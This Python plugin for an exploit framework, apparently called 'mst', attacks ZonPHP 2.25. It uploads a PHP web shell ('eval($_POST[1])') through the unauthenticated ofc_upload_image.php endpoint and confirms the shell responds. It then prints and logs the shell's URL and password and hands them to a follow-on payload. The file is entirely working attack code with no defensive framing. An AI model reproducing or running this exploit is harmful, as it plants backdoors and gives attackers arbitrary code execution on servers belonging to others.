
class mstplugin:
    infos = [
        ['NAME','ZonPHP 2.25 - Remote Code Execution (RCE) Vulnerability'],
        ['AUTHOR','mst'],
        ['UPTIME','20131027'],
        ['WEBSITE','http://mstoor.duapp.com']
        ]
    opts  = [
        ['RURL','localhost','target url'],
        ['RPORT','80','target port'],
        ['RPATH','/','target app-path'],
        ['PAYLOAD','','you can change it :)']
        ]
    def exploit(self):
        if RPORT == "443":
            url = "https://%s%s"%(RURL,RPATH)
        elif RPORT == "80":
            url = "http://%s%s"%(RURL,RPATH)
        else:
            url = "http://%s:%s%s"%(RURL,RPORT,RPATH)
        shell = "<?php eval($_POST[1]);?>"
        shurl = url+"mstshell.php"
        shpwd = "1"
        exp   = url+"ofc/ofc_upload_image.php?name=mstshell.php"
        head  = {"User-Agent":"Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0","Content-Type":"text/plain"}
        try:
            color.cprint("[+] Sending exp..",YELLOW)
            tmp=urllib2.Request(exp,shell,head)
            res=urllib2.urlopen(tmp)
            check=fuck.urlget(shurl)
            if check.getcode() == 200:
                color.cprint("[*] Exploit Successful !",CYAN)
                color.cprint("[-] Shell: %s\n[-] Paswd: %s"%(shurl,shpwd),GREEN)
                fuck.writelog("ZonPHP_2.25",shurl+":"+shpwd)
                fuck.topayload(PAYLOAD,[shurl,shpwd])
            else:
                color.cprint("[!] Exploit False :%s"%check.getcode(),RED)
        except Exception,e:
            color.cprint("[!] ERR:%s"%e,RED)
